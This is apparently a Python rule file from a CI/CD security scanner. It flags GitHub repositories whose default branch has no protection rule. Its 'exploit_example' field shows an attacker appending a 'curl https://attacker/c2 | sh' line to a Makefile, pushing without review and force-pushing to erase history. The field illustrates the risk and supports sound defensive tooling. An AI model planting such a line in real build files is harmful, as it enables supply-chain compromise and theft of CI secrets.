"""SCM-001. Default branch has no branch protection rule.

Maps to OpenSSF Scorecard ``Branch-Protection``. The Scorecard check
keys on whether the default branch has a protection rule with
"meaningful" settings; ``SCM-001`` fires the moment the rule itself
is absent (the GitHub API returns 404 for the protection endpoint),
which is the strongest "branch protection is off" signal available
without org-admin scope.
"""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from ..base import SCMRepoSnapshot, default_branch_name, repo_resource

RULE = Rule(
    id="SCM-001",
    title="Default branch has no protection rule",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-1",),
    esf=("ESF-S-CHANGE-CONTROL",),
    cwe=("CWE-284",),
    recommendation=(
        "Add a branch protection rule on the default branch in the "
        "repository's Settings -> Branches. At minimum require pull "
        "request reviews before merging, require status checks to "
        "pass, and disable force-pushes / deletions. Match the rule "
        "to OpenSSF Scorecard's Branch-Protection thresholds for the "
        "organization's compliance baseline."
    ),
    docs_note=(
        "Without a branch protection rule on the default branch, "
        "anyone with write access can force-push, delete the branch, "
        "or merge directly without review. Even when CI runs on the "
        "branch, an unprotected default branch lets a single "
        "compromised maintainer rewrite history and erase the audit "
        "trail. The check is sourced from the GitHub REST API "
        "(``GET /repos/{owner}/{repo}/branches/{branch}/protection``); "
        "a 404 response is itself the failure signal."
    ),
    incident_refs=(
        "Numerous post-incident reports (PyPI / RubyGems package "
        "compromises 2018-2024) trace the initial maintainer-account "
        "takeover step to the absence of branch protection: the "
        "attacker pushed a single tampered commit to the default "
        "branch, the release pipeline ran on push, the malicious "
        "build shipped to the registry within minutes, and recovery "
        "required force-pushing the audit trail itself. Branch "
        "protection turns the entire class of attack into a "
        "review-then-merge gate.",
    ),
    exploit_example=(
        "# With no protection rule on ``main``, a single compromised\n"
        "# maintainer credential is enough to ship a tampered build:\n"
        "#\n"
        "#   git checkout main\n"
        "#   echo 'curl https://attacker/c2 | sh' >> Makefile\n"
        "#   git commit -am 'fix: tweak'\n"
        "#   git push origin main           # no review required\n"
        "#   # CI now runs the tampered build with full secret access.\n"
        "#\n"
        "# Recovery needs force-push to rewrite the trail:\n"
        "#   git push --force origin main   # also unprotected\n"
        "#\n"
        "# A protection rule with `required_pull_request_reviews` set\n"
        "# and `allow_force_pushes: false` blocks both the push and\n"
        "# the rewrite without giving up an inch of velocity."
    ),
)


def check(snapshot: SCMRepoSnapshot) -> Finding:
    branch = default_branch_name(snapshot)
    has_protection = isinstance(snapshot.default_branch_protection, dict)
    passed = has_protection
    desc = (
        f"Default branch ``{branch}`` has a protection rule configured."
        if passed else
        f"Default branch ``{branch}`` has no protection rule. Anyone "
        f"with write access can force-push, delete the branch, or "
        f"merge without review. The GitHub REST API returned no "
        f"protection settings for this branch."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=repo_resource(snapshot), description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
